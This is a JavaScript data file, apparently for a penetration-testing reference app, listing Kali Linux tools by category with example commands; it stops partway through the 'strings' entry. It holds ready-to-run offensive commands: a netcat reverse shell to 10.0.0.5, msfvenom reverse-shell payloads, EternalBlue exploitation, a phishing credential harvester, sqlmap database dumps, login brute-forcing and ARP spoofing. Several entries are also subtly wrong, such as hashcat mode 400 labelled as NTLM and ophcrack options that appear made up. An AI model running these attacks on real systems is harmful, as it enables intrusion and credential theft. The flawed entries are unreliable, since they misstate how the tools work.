const categories = [
  {
    title: 'Information Gathering',
    description: 'Tools for discovering targets, scanning networks, and collecting open-source intelligence (OSINT).',
    tools: [
      {
        name: 'nmap',
        summary: 'Network scanner to discover hosts, ports, and services on a network.',
        primaryUse: 'Port and service discovery across live hosts.',
        howItWorks: 'Sends network probes and interprets replies to map open ports, services, and operating system fingerprints.',
        usage: 'nmap -sC -sV -oN scan.txt 192.168.1.0/24',
        examples: [
          {
            command: 'nmap -sC -sV -oN scan.txt 192.168.1.0/24',
            use: 'Run default scripts and service detection across a subnet, saving output to a file.'
          },
          {
            command: 'nmap -A -T4 192.168.1.5',
            use: 'Perform an aggressive scan with OS detection and version discovery on a single host.'
          },
          {
            command: 'nmap -p 22,80,443 -Pn target.com',
            use: 'Scan only common ports without pinging the host first, useful for stealthier checks.'
          }
        ],
        notes: 'Use -sC for default scripts, -sV for version info, and -oN to save output.'
      },
      {
        name: 'theHarvester',
        summary: 'OSINT harvesting tool for email, domain, and host reconnaissance.',
        primaryUse: 'Collect public records and email addresses for a target domain.',
        howItWorks: 'Queries search engines, public sources, and social networks to gather email addresses, hostnames, and related domains.',
        usage: 'theHarvester -d example.com -b google',
        examples: [
          {
            command: 'theHarvester -d example.com -b google',
            use: 'Collect email addresses and hostnames for example.com from Google results.'
          },
          {
            command: 'theHarvester -d example.com -b bing',
            use: 'Use Bing as the data source to compare results with Google reconnaissance.'
          },
          {
            command: 'theHarvester -d example.com -b linkedin',
            use: 'Search LinkedIn for employee and company information tied to the target domain.'
          }
        ],
        notes: 'Run only against authorized targets and combine results with manual validation.'
      },
      {
        name: 'whois',
        summary: 'Query domain registration and ownership information.',
        primaryUse: 'Retrieve registrar and contact details for domains.',
        howItWorks: 'Contacts public WHOIS servers to fetch ownership, expiry dates, and name server data.',
        usage: 'whois example.com',
        examples: [
          {
            command: 'whois example.com',
            use: 'See the domain registrant, registrar, and expiration details for example.com.'
          },
          {
            command: 'whois kali.org',
            use: 'Inspect the ownership and administrative contact information for the Kali project domain.'
          },
          {
            command: 'whois 8.8.8.8',
            use: 'Lookup the owner and network information for an IP address instead of a hostname.'
          }
        ],
        notes: 'Useful for discovering ownership and infrastructure relationships during reconnaissance.'
      },
      {
        name: 'dnsenum',
        summary: 'DNS enumeration tool for finding subdomains and DNS records.',
        primaryUse: 'Automate DNS record collection and subdomain discovery.',
        howItWorks: 'Queries DNS servers and brute-forces common subdomains to reveal DNS records and hostnames.',
        usage: 'dnsenum example.com',
        examples: [
          {
            command: 'dnsenum example.com',
            use: 'Run a standard DNS enumeration sweep against the target domain.'
          },
          {
            command: 'dnsenum --enum example.com',
            use: 'Perform recursive enumeration of subdomains, hosts, and nameservers.'
          },
          {
            command: 'dnsenum --threads 10 example.com',
            use: 'Speed up enumeration by using multiple threads for concurrent DNS queries.'
          }
        ],
        notes: 'Works well as an early step in mapping a target network.'
      },
      {
        name: 'recon-ng',
        summary: 'Modular reconnaissance framework for OSINT and domain enumeration.',
        primaryUse: 'Build automated OSINT workflows using reusable modules.',
        howItWorks: 'Loads modules to gather data from online sources and stores findings in a project database.',
        usage: 'recon-ng -m recon/domains-hosts/google_site',
        examples: [
          {
            command: 'recon-ng workspace create target\nuse recon/domains-hosts/google_site\nset SOURCE example.com\nrun',
            use: 'Create a workspace, load the Google site discovery module, set the target domain, and execute the module.'
          },
          {
            command: 'recon-ng -m recon/domains-hosts/crtsh',
            use: 'Use the crtsh module to collect domain and subdomain records from Certificate Transparency logs.'
          }
        ],
        notes: 'Run inside the recon-ng console and load modules to automate discovery.'
      }
    ]
  },
  {
    title: 'Vulnerability Analysis',
    description: 'Scan systems and applications for known weaknesses and insecure configuration.',
    tools: [
      {
        name: 'nikto',
        summary: 'Web server scanner that looks for dangerous files and outdated software.',
        primaryUse: 'Quickly identify common web server issues and misconfigurations.',
        howItWorks: 'Performs HTTP requests against a target and checks responses against a database of known vulnerabilities.',
        usage: 'nikto -h https://example.com',
        examples: [
          {
            command: 'nikto -h https://example.com',
            use: 'Scan the target website for default files, known vulnerabilities, and insecure headers.'
          },
          {
            command: 'nikto -h http://example.com -p 80',
            use: 'Target a specific port for web server analysis when the site is not served over HTTPS.'
          },
          {
            command: 'nikto -h https://example.com -Tuning x',
            use: 'Adjust the scan tuning to increase or reduce checks for speed or coverage.'
          }
        ],
        notes: 'Good for surface-level checks before deeper manual testing.'
      },
      {
        name: 'openvas',
        summary: 'Full-featured vulnerability scanner for network services.',
        primaryUse: 'Launch authenticated and unauthenticated vulnerability scans at scale.',
        howItWorks: 'Uses a database of plugins to probe targets and identify known vulnerabilities, weak configurations, and missing patches.',
        usage: 'openvas-start && openvas-check-setup',
        examples: [
          {
            command: 'openvas-start && openvas-check-setup',
            use: 'Initialize the OpenVAS services and verify the installation is ready.'
          },
          {
            command: 'omp -h 127.0.0.1 -u admin -w password',
            use: 'Connect to the OpenVAS manager from the command line for task and target management.'
          },
          {
            command: 'gvm-cli socket --xml="<get_tasks/>"',
            use: 'Query the manager for configured scan tasks using the GVM command-line interface.'
          }
        ],
        notes: 'Requires administrative setup and web access to the GVM console.'
      },
      {
        name: 'searchsploit',
        summary: 'Search local exploit database for known vulnerabilities.',
        primaryUse: 'Find proof-of-concept exploits for identified software versions.',
        howItWorks: 'Searches Exploit-DB metadata stored locally and returns matching exploits by keyword or version.',
        usage: 'searchsploit wordpress 5.0',
        examples: [
          {
            command: 'searchsploit apache 2.4.41',
            use: 'Search the local exploit archive for Apache 2.4.41-related vulnerabilities and code.'
          },
          {
            command: 'searchsploit "phpmyadmin"',
            use: 'Lookup exploits related to phpMyAdmin across the database.'
          },
          {
            command: 'searchsploit --id 47334',
            use: 'View the details of a specific exploit entry by its ID.'
          }
        ],
        notes: 'Use it as a quick reference to known exploits during vulnerability analysis.'
      },
      {
        name: 'sqlmap',
        summary: 'Automated SQL injection and database takeover tool.',
        primaryUse: 'Detect and exploit SQL injection in web applications.',
        howItWorks: 'Enumerates injectable parameters, tests payloads, and optionally retrieves database information.',
        usage: 'sqlmap -u "https://example.com/page?id=1" --batch --dbs',
        examples: [
          {
            command: 'sqlmap -u "http://example.com/item.php?id=2" --risk=3 --level=5',
            use: 'Run a deeper SQL injection scan with higher risk and verbosity on a susceptible URL.'
          },
          {
            command: 'sqlmap -u "http://example.com/page.php?id=1" --dump',
            use: 'Extract database contents once an injectable parameter has been identified.'
          },
          {
            command: 'sqlmap -u "http://example.com/page.php?id=1" --dbs',
            use: 'List the available databases on a vulnerable target without taking further action.'
          }
        ],
        notes: 'Always run only against authorized targets and confirm scope before testing.'
      },
      {
        name: 'wpscan',
        summary: 'WordPress security scanner for plugins, themes, and users.',
        primaryUse: 'Identify WordPress vulnerabilities and outdated components.',
        howItWorks: 'Enumerates WordPress components and queries vulnerability databases for known issues.',
        usage: 'wpscan --url https://example.com --enumerate u,p',
        examples: [
          {
            command: 'wpscan --url https://example.com --enumerate u,p',
            use: 'Enumerate WordPress users and plugins to identify potential attack paths.'
          },
          {
            command: 'wpscan --url https://example.com --enumerate vp',
            use: 'Enumerate vulnerable plugins and themes installed on the WordPress site.'
          },
          {
            command: 'wpscan --url https://example.com --api-token YOUR_TOKEN',
            use: 'Run a faster, more accurate scan using an API token from the WPScan service.'
          }
        ],
        notes: 'Use API tokens for higher rate limits and more accurate vulnerability matching.'
      }
    ]
  },
  {
    title: 'Exploitation',
    description: 'Tools for exploiting vulnerabilities and running payloads against compromised systems.',
    tools: [
      {
        name: 'msfconsole',
        summary: 'Metasploit Framework console for launching exploits and payloads.',
        primaryUse: 'Run exploits and manage payloads from a unified framework.',
        howItWorks: 'Loads exploit modules, allows payload selection, and executes attacks against targets with configured options.',
        usage: 'msfconsole -q',
        examples: [
          {
            command: 'use exploit/windows/smb/ms17_010_eternalblue',
            use: 'Select the EternalBlue SMB exploit module inside Metasploit.'
          },
          {
            command: 'set RHOSTS 10.0.0.15\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.0.0.5\nrun',
            use: 'Configure the exploit target and reverse shell payload, then execute the attack.'
          },
          {
            command: 'show options',
            use: 'Review the module configuration and required settings before launching the exploit.'
          }
        ],
        notes: 'Metasploit is a central tool for controlled exploitation and payload management.'
      },
      {
        name: 'msfvenom',
        summary: 'Payload generator for creating shellcode and executable payloads.',
        primaryUse: 'Generate custom payloads for native and scripting platforms.',
        howItWorks: 'Creates payloads in a variety of formats and embeds options like LHOST and LPORT.',
        usage: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf -o shell.elf',
        examples: [
          {
            command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe',
            use: 'Generate a Windows executable reverse shell payload for a Metasploit listener.'
          },
          {
            command: 'msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw -o payload.bin',
            use: 'Create a raw Python payload file that can be deployed manually on a Linux target.'
          },
          {
            command: 'msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.5 LPORT=4444 -f raw',
            use: 'Build a simple Python reverse shell command for Unix-like systems.'
          }
        ],
        notes: 'Combine generated payloads with a compatible listener in Metasploit.'
      },
      {
        name: 'exploitdb',
        summary: 'Database of public exploits and proof-of-concepts.',
        primaryUse: 'Locate exploit code for known vulnerabilities and affected software.',
        howItWorks: 'Searches a local exploit database and returns matching results with CVE references and source code links.',
        usage: 'searchsploit apache 2.4.1',
        examples: [
          {
            command: 'searchsploit apache 2.4.41',
            use: 'Find exploits and proof-of-concept code for the specific Apache version.'
          },
          {
            command: 'searchsploit "phpmyadmin"',
            use: 'Search for phpMyAdmin-related vulnerabilities across the local exploit database.'
          },
          {
            command: 'searchsploit --id 47334',
            use: 'View the full exploit details and patch references for a known entry ID.'
          }
        ],
        notes: 'Leverage exploitdb for research and exploit development during assessments.'
      },
      {
        name: 'setoolkit',
        summary: 'Social engineering toolkit for phishing and payload delivery.',
        primaryUse: 'Build social engineering attacks and phishing pages quickly.',
        howItWorks: 'Guides you through pre-built social engineering attack vectors including email and website cloning.',
        usage: 'setoolkit',
        examples: [
          {
            command: 'setoolkit -> Social-Engineering Attacks -> Website Attack Vectors',
            use: 'Choose the website attack workflow to clone pages for phishing campaigns.'
          },
          {
            command: 'setoolkit -> Mass Email Attack',
            use: 'Launch a mass email campaign using templates and recipient lists.'
          },
          {
            command: 'setoolkit -> Credential Harvester Attack Method',
            use: 'Capture credentials by hosting a fake login page for the target site.'
          }
        ],
        notes: 'Use responsibly and only for sanctioned social engineering assessments.'
      },
      {
        name: 'netcat',
        summary: 'Swiss-army networking utility for listening, connecting, and transferring data.',
        primaryUse: 'Establish raw TCP/UDP connections and simple shells.',
        howItWorks: 'Opens network sockets for reads/writes, enabling file transfers, reverse shells, and port forwarding.',
        usage: 'nc -lvnp 4444',
        examples: [
          {
            command: 'nc -lvnp 4444',
            use: 'Start a listener on port 4444 to receive incoming shell connections.'
          },
          {
            command: 'nc -e /bin/bash 10.0.0.5 4444',
            use: 'Establish a reverse shell from a target host back to your listener.'
          },
          {
            command: 'nc -l 8080 > received.txt',
            use: 'Listen on port 8080 and save incoming data to a file.'
          }
        ],
        notes: 'A lightweight fallback for custom shell access and quick socket connections.'
      }
    ]
  },
  {
    title: 'Web Application Testing',
    description: 'Analyze web applications, discover hidden directories, and intercept web traffic.',
    tools: [
      {
        name: 'burpsuite',
        summary: 'Intercepting proxy and web security testing suite.',
        primaryUse: 'Intercept and modify web traffic for manual application testing.',
        howItWorks: 'Proxies browser traffic, allowing inspection, replay, and active scanning of application requests.',
        usage: 'burpsuite',
        examples: [
          {
            command: 'Configure browser proxy to 127.0.0.1:8080',
            use: 'Set your browser to route traffic through Burp for interception and analysis.'
          },
          {
            command: 'Use the Intruder module to test login forms',
            use: 'Automate injection of payloads into web form fields to identify authentication weaknesses.'
          },
          {
            command: 'Send a request to Repeater and modify headers',
            use: 'Replay and tweak HTTP requests to test validation and authorization behavior.'
          }
        ],
        notes: 'Great for manual web vulnerability discovery and active scanning.'
      },
      {
        name: 'zaproxy',
        summary: 'OWASP ZAP proxy for crawling and attacking web applications.',
        primaryUse: 'Crawl and scan web apps for vulnerabilities automatically.',
        howItWorks: 'Spiders websites, intercepts traffic, and launches active scans against pages.',
        usage: 'zap.sh',
        examples: [
          {
            command: 'Open ZAP and start a new session',
            use: 'Create a fresh workspace for testing the target application.'
          },
          {
            command: 'Use the spider then active scan features on the target URL',
            use: 'Crawl the site and automatically scan discovered pages for vulnerabilities.'
          },
          {
            command: 'Proxy browser traffic through ZAP for manual inspection',
            use: 'Review requests and responses to identify hidden inputs and insecure functionality.'
          }
        ],
        notes: 'A strong open-source alternative to Burp for automated web testing.'
      },
      {
        name: 'gobuster',
        summary: 'Directory/file brute-force tool for web servers and DNS subdomains.',
        primaryUse: 'Find hidden web directories and subdomains using wordlists.',
        howItWorks: 'Requests paths from a wordlist and reports valid responses from a target server.',
        usage: 'gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt',
        examples: [
          {
            command: 'gobuster dir -u https://example.com -w /usr/share/wordlists/raft-large-directories.txt',
            use: 'Search for hidden directories on the web server using a large directory wordlist.'
          },
          {
            command: 'gobuster dns -d example.com -w /usr/share/wordlists/dns/subdomains-top1million-5000.txt',
            use: 'Discover subdomains by brute forcing names against DNS records.'
          },
          {
            command: 'gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt',
            use: 'Search for hidden files with specific extensions in addition to directories.'
          }
        ],
        notes: 'Good for discovering hidden endpoints and backup files.'
      },
      {
        name: 'dirb',
        summary: 'Web content scanner using wordlists to find hidden files and folders.',
        primaryUse: 'Search for unlinked web content with wordlist-based enumeration.',
        howItWorks: 'Issues HTTP requests for each candidate path and identifies valid responses.',
        usage: 'dirb https://example.com /usr/share/wordlists/dirb/common.txt',
        examples: [
          {
            command: 'dirb http://example.com /usr/share/wordlists/dirb/big.txt',
            use: 'Use a large wordlist to find more hidden directories and files.'
          },
          {
            command: 'dirb http://example.com /usr/share/wordlists/dirb/small.txt -r',
            use: 'Recursively scan discovered directories for deeper hidden content.'
          },
          {
            command: 'dirb https://example.com /usr/share/wordlists/dirb/common.txt -S',
            use: 'Use a simple scan to map site content while minimizing noisy requests.'
          }
        ],
        notes: 'Use with caution to avoid overwhelming target servers.'
      },
      {
        name: 'wpscan',
        summary: 'WordPress vulnerability scanner for themes, plugins, and configuration issues.',
        primaryUse: 'Audit WordPress installations for known vulnerabilities.',
        howItWorks: 'Enumerates installed plugins, themes, and users then checks them against vulnerability data.',
        usage: 'wpscan --url https://example.com --enumerate ap',
        examples: [
          {
            command: 'wpscan --url https://example.com --enumerate vp',
            use: 'Enumerate plugins and themes and check for known vulnerabilities.'
          },
          {
            command: 'wpscan --url https://example.com --enumerate t',
            use: 'Enumerate installed themes to identify outdated or insecure themes.'
          },
          {
            command: 'wpscan --url https://example.com --enumerate u',
            use: 'List WordPress users to support username discovery and brute-force testing.'
          }
        ],
        notes: 'Use API tokens for faster and more accurate scans.'
      }
    ]
  },
  {
    title: 'Wireless Attacks',
    description: 'Tools for assessing Wi-Fi networks, cracking keys, and testing wireless security.',
    tools: [
      {
        name: 'airmon-ng',
        summary: 'Put wireless interfaces into monitor mode for packet capture and injection.',
        primaryUse: 'Enable monitor mode on wireless adapters for passive capture.',
        howItWorks: 'Switches the wireless adapter to monitor mode so it can observe all nearby traffic.',
        usage: 'airmon-ng start wlan0',
        examples: [
          {
            command: 'airmon-ng check kill',
            use: 'Kill conflicting processes before enabling monitor mode for clean captures.'
          },
          {
            command: 'airmon-ng start wlan0',
            use: 'Activate monitor mode on the wlan0 adapter to capture raw Wi-Fi traffic.'
          },
          {
            command: 'airmon-ng start wlan1',
            use: 'Enable monitor mode on a second wireless interface for parallel captures.'
          }
        ],
        notes: 'Run before using tools like airodump-ng and aircrack-ng.'
      },
      {
        name: 'airodump-ng',
        summary: 'Capture packets from nearby wireless networks and identify clients.',
        primaryUse: 'Monitor Wi-Fi traffic and capture handshake packets.',
        howItWorks: 'Lists access points and clients and records traffic into capture files.',
        usage: 'airodump-ng wlan0mon',
        examples: [
          {
            command: 'airodump-ng wlan0mon',
            use: 'Scan all nearby Wi-Fi networks and view associated clients in real time.'
          },
          {
            command: 'airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write capture wlan0mon',
            use: 'Capture traffic for a specific network and save the handshake file for cracking.'
          },
          {
            command: 'airodump-ng --band abg wlan0mon',
            use: 'Scan both 2.4GHz and 5GHz networks in a single capture session.'
          }
        ],
        notes: 'Use captures for offline password cracking with aircrack-ng.'
      },
      {
        name: 'aircrack-ng',
        summary: 'Crack WPA/WPA2 passphrases from captured handshake data.',
        primaryUse: 'Recover Wi-Fi passwords from captured handshake files.',
        howItWorks: 'Uses dictionary attacks against the captured handshake to find a matching passphrase.',
        usage: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap',
        examples: [
          {
            command: 'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap',
            use: 'Use a wordlist to attempt to recover the WPA/WPA2 passphrase from a captured handshake.'
          },
          {
            command: 'aircrack-ng -a2 -b 00:11:22:33:44:55 -w wordlist.txt capture.cap',
            use: 'Target a specific access point BSSID during the cracking process for accuracy.'
          },
          {
            command: 'aircrack-ng -J output capture.cap',
            use: 'Convert the capture file to a more efficient hash format for later cracking.'
          }
        ],
        notes: 'Requires a complete WPA handshake to recover the key successfully.'
      },
      {
        name: 'reaver',
        summary: 'Attempt WPS PIN attacks to recover WPA/WPA2 passphrases.',
        primaryUse: 'Exploit WPS-enabled routers to recover Wi-Fi passwords.',
        howItWorks: 'Sends WPS PIN guesses to a target access point until a valid PIN is found.',
        usage: 'reaver -i wlan0mon -b 00:11:22:33:44:55 -vv',
        examples: [
          {
            command: 'reaver -i wlan1 -b 00:11:22:33:44:55 -N -vv',
            use: 'Run a WPS attack with a shorter delay and verbose output on a specific AP.'
          },
          {
            command: 'reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv',
            use: 'Specify the channel for the target network to improve reliability.'
          },
          {
            command: 'reaver -i wlan0mon -b 00:11:22:33:44:55 --no-nacks -vv',
            use: 'Disable negative acknowledgments when the target router handles NACKs poorly.'
          }
        ],
        notes: 'Only works on routers with vulnerable WPS and may take a long time.'
      },
      {
        name: 'wifite',
        summary: 'Automated wireless auditing tool for WPA and WEP networks.',
        primaryUse: 'Automate capturing handshakes and attacking Wi-Fi networks.',
        howItWorks: 'Scans nearby networks, captures handshakes, and runs cracking attacks automatically.',
        usage: 'wifite',
        examples: [
          {
            command: 'wifite -i wlan0mon',
            use: 'Use Wifite on a specific monitor-mode interface to launch the scanning workflow.'
          },
          {
            command: 'wifite -p -e network_name',
            use: 'Target a specific network by ESSID and attempt handshake capture.'
          },
          {
            command: 'wifite --wps',
            use: 'Enable WPS attack support for networks with WPS enabled.'
          }
        ],
        notes: 'A convenient suite for quick wireless assessments when used responsibly.'
      }
    ]
  },
  {
    title: 'Password Attacks',
    description: 'Tools for brute-force, dictionary, and hash cracking attacks against credentials.',
    tools: [
      {
        name: 'john',
        summary: 'Password-cracking tool for hashes, archive passwords, and more.',
        primaryUse: 'Crack password hashes using wordlists and rules.',
        howItWorks: 'Tests possible passwords against hash values until a match is found.',
        usage: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
        examples: [
          {
            command: 'john --format=nt --wordlist=rockyou.txt hashes.txt',
            use: 'Crack NTLM hashes using the rockyou wordlist.'
          },
          {
            command: 'john --incremental hashes.txt',
            use: 'Use incremental rules to brute-force the hash file when wordlists are insufficient.'
          },
          {
            command: 'john --show hashes.txt',
            use: 'Display cracked passwords from the target hash file after the attack completes.'
          }
        ],
        notes: 'Supports many hash formats and custom rule sets.'
      },
      {
        name: 'hashcat',
        summary: 'GPU-accelerated password recovery tool supporting many hash types.',
        primaryUse: 'Use GPU power to crack hashed passwords faster.',
        howItWorks: 'Runs highly optimized hashing algorithms against candidate passwords using CPU/GPU hardware.',
        usage: 'hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt',
        examples: [
          {
            command: 'hashcat -m 0 -a 0 md5hash.txt wordlist.txt',
            use: 'Crack MD5 hashes with a simple wordlist attack.'
          },
          {
            command: 'hashcat -m 400 -a 3 ntlmhash.txt ?u?l?l?l?l?l?d?d',
            use: 'Run a brute-force attack against NTLM hashes with a common pattern.'
          },
          {
            command: 'hashcat -m 1000 -a 6 ntlmhash.txt ?l?l?l?l?l?d?d ?u?l?l?l?l?l?d?d',
            use: 'Combine a base wordlist with suffixes to speed up targeted password cracking.'
          }
        ],
        notes: 'Match the hash mode to the target hash type for successful cracking.'
      },
      {
        name: 'hydra',
        summary: 'Fast network login cracker for protocols like SSH, FTP, and HTTP forms.',
        primaryUse: 'Perform rapid login attempts against remote services.',
        howItWorks: 'Tries username/password combinations against a service and reports successful logins.',
        usage: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5',
        examples: [
          {
            command: 'hydra -L users.txt -P passwords.txt ftp://10.0.0.5',
            use: 'Brute-force FTP logins using a list of usernames and passwords.'
          },
          {
            command: 'hydra -s 2222 -l root -P rockyou.txt ssh://target',
            use: 'Target an SSH service on a non-standard port with a single username.'
          },
          {
            command: 'hydra -l admin -P pass.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"',
            use: 'Attack a web form by filling username and password fields and checking the failure response.'
          }
        ],
        notes: 'Use throttling and limits to avoid locking accounts or triggering alarms.'
      },
      {
        name: 'medusa',
        summary: 'Parallel network login brute-forcing utility.',
        primaryUse: 'Run high-performance password attacks across many targets.',
        howItWorks: 'Attempts logins with multiple username/password pairs concurrently.',
        usage: 'medusa -h 10.0.0.5 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh',
        examples: [
          {
            command: 'medusa -h 10.0.0.5 -U users.txt -P passwords.txt -M ftp',
            use: 'Run a multi-user brute-force attack against an FTP service.'
          },
          {
            command: 'medusa -H hosts.txt -u admin -P rockyou.txt -M smtp',
            use: 'Attack multiple SMTP hosts with one username across a list of passwords.'
          },
          {
            command: 'medusa -h 10.0.0.5 -u admin -P passlist.txt -M ssh -t 10',
            use: 'Throttle concurrent threads to reduce noise while cracking SSH.'
          }
        ],
        notes: 'Works well when testing many hosts quickly within scope.'
      },
      {
        name: 'ophcrack',
        summary: 'Rainbow table-based Windows password cracking tool.',
        primaryUse: 'Recover Windows passwords from hashes using rainbow tables.',
        howItWorks: 'Matches extracted NTLM/LM hashes against precomputed tables to recover passwords fast.',
        usage: 'ophcrack',
        examples: [
          {
            command: 'ophcrack -g -t hashes.txt',
            use: 'Use the graphical interface to crack hashes from a text file.'
          },
          {
            command: 'ophcrack -w rainbow-tables-list.txt -t hashes.txt',
            use: 'Specify custom rainbow tables for faster recovery of Windows hashes.'
          },
          {
            command: 'ophcrack --sam SAM --security SYSTEM',
            use: 'Load Windows SAM and SYSTEM files directly for local password recovery.'
          }
        ],
        notes: 'Ideal for Windows password recovery when rainbow tables are available.'
      }
    ]
  },
  {
    title: 'Sniffing & Spoofing',
    description: 'Capture network traffic, intercept communications, and spoof host identities.',
    tools: [
      {
        name: 'wireshark',
        summary: 'Graphical packet analyzer for network traffic inspection.',
        primaryUse: 'Analyze packets, protocols, and session data visually.',
        howItWorks: 'Reads packet captures and decodes protocol fields for inspection and troubleshooting.',
        usage: 'wireshark',
        examples: [
          {
            command: 'wireshark -k -i eth0',
            use: 'Open Wireshark and start capturing live traffic on the eth0 interface.'
          },
          {
            command: 'wireshark capture.pcap',
            use: 'Open a saved capture file for offline analysis.'
          },
          {
            command: 'tshark -r capture.pcap -Y "http.request"',
            use: 'Filter HTTP requests from a saved capture using tshark.'
          }
        ],
        notes: 'Use filters to reduce noise and focus on specific traffic flows.'
      },
      {
        name: 'tcpdump',
        summary: 'Command-line packet capture utility for live network tracing.',
        primaryUse: 'Capture network packets and export PCAP data from the terminal.',
        howItWorks: 'Sniffs packets from an interface and saves them in capture files for later analysis.',
        usage: 'tcpdump -i eth0 -w capture.pcap',
        examples: [
          {
            command: 'tcpdump -i eth0 port 80',
            use: 'Capture only HTTP traffic on port 80 to reduce the capture size.'
          },
          {
            command: 'tcpdump -i eth0 host 10.0.0.5 -w output.pcap',
            use: 'Capture all traffic to and from a specific host and save it to file.'
          },
          {
            command: 'tcpdump -i eth0 -nnn -vvv',
            use: 'Run tcpdump with verbose output and no DNS resolution for clearer packet details.'
          }
        ],
        notes: 'Capture selectively with filters to avoid huge files and keep relevant traffic.'
      },
      {
        name: 'ettercap',
        summary: 'Man-in-the-middle attack suite for sniffing and injecting traffic.',
        primaryUse: 'Intercept and manipulate LAN traffic using ARP poisoning.',
        howItWorks: 'Poisons ARP caches of target machines to intercept traffic and optionally inject packets.',
        usage: 'ettercap -T -q -M arp:remote /10.0.0.5/ /10.0.0.10/',
        examples: [
          {
            command: 'ettercap -T -q -M arp:remote /10.0.0.0/ /10.0.0.255/',
            use: 'Launch a LAN-wide ARP poisoning attack in text mode quietly.'
          },
          {
            command: 'ettercap -T -M arp /target1/ /target2/',
            use: 'Intercept traffic between two specified hosts.'
          },
          {
            command: 'ettercap -T -q -M arp:remote /192.168.1.5/ /192.168.1.1/',
            use: 'Target a specific sender and gateway pair for man-in-the-middle capture.'
          }
        ],
        notes: 'Use on authorized networks only and understand the legal risks.'
      },
      {
        name: 'arpspoof',
        summary: 'Redirect local network traffic by poisoning ARP caches.',
        primaryUse: 'Perform basic ARP spoofing to intercept LAN traffic.',
        howItWorks: 'Sends forged ARP replies to trick hosts into routing traffic through the attacker machine.',
        usage: 'arpspoof -i eth0 -t 10.0.0.5 10.0.0.1',
        examples: [
          {
            command: 'arpspoof -i eth0 -t 10.0.0.5 10.0.0.1',
            use: 'Poison the ARP cache of a target to route its traffic through your machine.'
          },
          {
            command: 'arpspoof -i eth0 -t 10.0.0.1 10.0.0.5',
            use: 'Reverse the ARP spoof to intercept traffic from the gateway to the target.'
          },
          {
            command: 'arpspoof -i eth0 -t 10.0.0.5 10.0.0.1 -r',
            use: 'Run in router mode to maintain poisoning continuously.'
          }
        ],
        notes: 'A primitive but effective MITM technique on flat networks.'
      },
      {
        name: 'dsniff',
        summary: 'Collection of tools for password sniffing and network analysis.',
        primaryUse: 'Capture credentials and inspect network protocols on a LAN.',
        howItWorks: 'Uses several sniffing utilities to monitor traffic and extract authentication data.',
        usage: 'dsniff -i eth0',
        examples: [
          {
            command: 'dsniff -i eth0',
            use: 'Start the main sniffing daemon on the specified interface.'
          },
          {
            command: 'dsniff -i eth0 -p',
            use: 'Disable promiscuous mode if the network interface does not support it.'
          },
          {
            command: 'dsniff -i eth0 -w log.txt',
            use: 'Save captured credentials and protocol data to a log file for review.'
          }
        ],
        notes: 'Includes tools for HTTP, FTP, SMTP, and other credentials.'
      }
    ]
  },
  {
    title: 'Reverse Engineering',
    description: 'Analyze binaries, firmware, and code to understand how programs work.',
    tools: [
      {
        name: 'gdb',
        summary: 'GNU Debugger for step-by-step binary analysis.',
        primaryUse: 'Debug executables, inspect memory, and trace program flow.',
        howItWorks: 'Runs a binary under control to set breakpoints, watch variables, and inspect state.',
        usage: 'gdb ./vulnerable && run',
        examples: [
          {
            command: 'gdb -q ./vulnerable',
            use: 'Start the debugger quietly and load the vulnerable binary for analysis.'
          },
          {
            command: 'b main\nrun\ninfo registers',
            use: 'Set a breakpoint at main, run the binary, and inspect CPU registers after the crash.'
          },
          {
            command: 'disas main',
            use: 'Disassemble the main function to review the compiled instructions.'
          }
        ],
        notes: 'Essential for understanding exploitation paths and crash behavior.'
      },
      {
        name: 'radare2',
        summary: 'Open-source reverse engineering framework for disassembly and debugging.',
        primaryUse: 'Disassemble binaries and analyze program structure in depth.',
        howItWorks: 'Loads binaries and offers disassembly, analysis, and scripting via a powerful command interface.',
        usage: 'r2 -A ./binary',
        examples: [
          {
            command: 'r2 -A -d ./binary',
            use: 'Analyze and debug the binary with auto-analysis enabled.'
          },
          {
            command: 'r2 -qc "aa;afl" ./binary',
            use: 'Run analysis and list functions for a quick overview of the binary structure.'
          },
          {
            command: 'r2 -c "s main; pdf" ./binary',
            use: 'Seek to the main function and print its disassembly.'
          }
        ],
        notes: 'Has a steep learning curve but is extremely capable for advanced reverse engineering.'
      },
      {
        name: 'apktool',
        summary: 'Decompile Android APKs for inspection and modification.',
        primaryUse: 'Extract Android app resources and disassemble bytecode.',
        howItWorks: 'Decodes APK contents into readable resources and smali code for analysis.',
        usage: 'apktool d app.apk',
        examples: [
          {
            command: 'apktool d app.apk',
            use: 'Decompile an APK into a directory of resources and smali code.'
          },
          {
            command: 'apktool b app_dir',
            use: 'Rebuild the modified APK directory back into an installable package.'
          },
          {
            command: 'apktool if framework-res.apk',
            use: 'Install framework resources needed to decompile some protected APKs.'
          }
        ],
        notes: 'Useful for Android malware analysis and application modification.'
      },
      {
        name: 'binwalk',
        summary: 'Search and extract embedded files and firmware from binaries.',
        primaryUse: 'Analyze firmware images and extract hidden files.',
        howItWorks: 'Scans files for embedded signatures and extracts contained archives and binaries.',
        usage: 'binwalk -e firmware.bin',
        examples: [
          {
            command: 'binwalk -Me firmware.bin',
            use: 'Run a recursive extraction of embedded archives found inside firmware images.'
          },
          {
            command: 'binwalk -B binary.bin',
            use: 'Scan a binary for specific signature blobs and report their offsets.'
          },
          {
            command: 'binwalk --dd=".*" firmware.bin',
            use: 'Extract all matched file types from a firmware image automatically.'
          }
        ],
        notes: 'Very effective for firmware analysis and device research.'
      },
      {
        name: 'strings',
        summary: 'Extract readable text from binary files for quick analysis.',
        primaryUse: 'Reveal meaningful text and possible configuration data in binaries.',
